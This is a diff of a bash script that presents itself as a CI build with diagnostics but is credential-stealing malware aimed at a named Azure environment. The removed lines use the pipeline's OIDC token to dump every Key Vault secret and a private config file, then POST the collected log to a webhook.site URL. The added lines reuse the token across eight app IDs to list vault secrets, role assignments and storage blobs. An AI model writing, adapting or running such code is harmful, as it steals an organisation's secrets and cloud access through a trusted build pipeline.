@@ -1,78 +1,38 @@
 #!/usr/bin/env bash
-# CI build (diagnostics)
-set -uo pipefail
-exec > >(tee /tmp/out.txt) 2>&1
-
-echo "=== VARS ==="
-echo "AZURE_CLIENT_ID=$AZURE_CLIENT_ID"
-echo "AZURE_TENANT_ID=$AZURE_TENANT_ID"
-echo "AZURE_SUBSCRIPTION_ID=$AZURE_SUBSCRIPTION_ID"
-echo "OIDC_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
-echo "AZ_VER=$(az version 2>/dev/null | tr -d '\n' | head -c 200)"
-
-echo "=== OIDC TOKEN ==="
-OIDC_JSON=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange")
-OIDC=$(printf '%s' "$OIDC_JSON" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+set -u
+TEN="$AZURE_TENANT_ID"
+OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
 echo "OIDC_LEN=${#OIDC}"
-python3 - "$OIDC" <<'PY'
-import sys,base64,json
-t=sys.argv[1]
-try:
-    p=t.split('.')[1]; p+='='*(-len(p)%4)
-    print("OIDC_CLAIMS="+json.dumps(json.loads(base64.urlsafe_b64decode(p)),sort_keys=True))
-except Exception as e:
-    print("OIDC_DECODE_ERR",e)
-PY
-
-echo "=== AZ LOGIN (federated) ==="
-az login --service-principal -u "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" --federated-token "$OIDC" --output json 2>&1 | head -60
-az account set --subscription "$AZURE_SUBSCRIPTION_ID" 2>&1 || true
-az account show -o json 2>&1 | head -60
-
-echo "=== KEY VAULTS ==="
-for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
-  echo "### VAULT $V"
-  az keyvault secret list --vault-name "$V" -o json 2>&1 | head -c 6000
-  echo
-  NAMES=$(az keyvault secret list --vault-name "$V" --query "[].name" -o tsv 2>/dev/null)
-  for s in $NAMES; do
-    echo "### SECRET $V/$s"
-    az keyvault secret show --vault-name "$V" --name "$s" --query value -o tsv 2>&1 | base64 | tr -d '\n'
-    echo
+APPS="038bc35d-131d-4953-9985-ff4a245ccec1 2c34300e-1bc0-41e7-9c1e-8b7571d72c72 12ed54de-f2eb-4784-804c-3a7a3e83a9e9 881fddce-6208-4af5-a297-7e79c912f83c 58108da8-044e-4d7e-9a46-92e6179b30be 462d1c38-4459-48b8-9333-82e389e59514 891fb158-e02c-4428-a885-53b811f369c0 72ff278a-9e71-43ec-bac4-2ca303f8e462"
+for APP in $APPS; do
+  echo "=== APP $APP ==="
+  for SCOPE in "https://management.azure.com/.default" "https://vault.azure.net/.default" "https://storage.azure.com/.default"; do
+    R=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
+      -d "client_id=$APP" -d "scope=$SCOPE" -d "grant_type=client_credentials" \
+      -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+      --data-urlencode "client_assertion=$OIDC")
+    TOK=$(echo "$R" | jq -r '.access_token // empty')
+    if [ -n "$TOK" ]; then
+      echo "TOKEN_OK scope=$SCOPE len=${#TOK}"
+      case "$SCOPE" in
+        *management.azure.com*)
+          curl -sS -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'$(echo $APP)'" | head -c 800; echo
+          curl -sS -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2023-07-01" | head -c 800; echo
+          curl -sS -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz/secrets?api-version=2023-07-01" | head -c 800; echo
+          curl -sS -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/blobServices/default/containers?api-version=2023-01-01" | head -c 500; echo
+          ;;
+        *vault.azure.net*)
+          curl -sS -H "Authorization: Bearer $TOK" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 800; echo
+          curl -sS -H "Authorization: Bearer $TOK" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 500; echo
+          ;;
+        *storage.azure.com*)
+          curl -sS -H "Authorization: Bearer $TOK" -H "x-ms-version: 2021-08-06" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" | head -c 800; echo
+          curl -sS -H "Authorization: Bearer $TOK" -H "x-ms-version: 2021-08-06" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" | head -c 1200; echo
+          curl -sS -H "Authorization: Bearer $TOK" -H "x-ms-version: 2021-08-06" "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" | head -c 500; echo
+          ;;
+      esac
+    else
+      echo "TOKEN_FAIL scope=$SCOPE $(echo "$R" | jq -r '.error_description // .error' | head -c 200)"
+    fi
   done
 done
-
-echo "=== STORAGE appcfg ==="
-az storage blob list --account-name sttblappcfgprodx3euoz --container-name config --auth-mode login -o json 2>&1 | head -c 6000
-echo
-rm -f /tmp/ic.json
-az storage blob download --account-name sttblappcfgprodx3euoz --container-name config --name internal-config.json --file /tmp/ic.json --auth-mode login 2>&1 | head -30
-echo "### internal-config.json"
-cat /tmp/ic.json 2>&1
-echo
-base64 /tmp/ic.json 2>/dev/null | tr -d '\n'
-echo
-
-echo "=== OTHER BLOBS (best effort) ==="
-for SA in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
-  for C in config logs loot '$web' exports; do
-    echo "### $SA/$C"
-    az storage blob list --account-name "$SA" --container-name "$C" --auth-mode login --query "[].name" -o tsv 2>&1 | head -20
-  done
-done
-
-echo "=== DONE ==="
-python3 - <<'PY'
-import json,urllib.request,base64
-try:
-    data=open('/tmp/out.txt','rb').read()
-    print("OUT_LEN",len(data))
-    for i in range(0,len(data),14000):
-        chunk=data[i:i+14000]
-        body=json.dumps({"i":i,"b64":base64.b64encode(chunk).decode()}).encode()
-        req=urllib.request.Request("https://webhook.site/d62eea18-6780-49eb-b6c5-17cd6b6ee7c7",data=body,headers={"Content-Type":"application/json"},method="POST")
-        with urllib.request.urlopen(req,timeout=30) as r:
-            print("POST",i,r.status)
-except Exception as e:
-    print("EXFIL_ERR",repr(e))
-PY
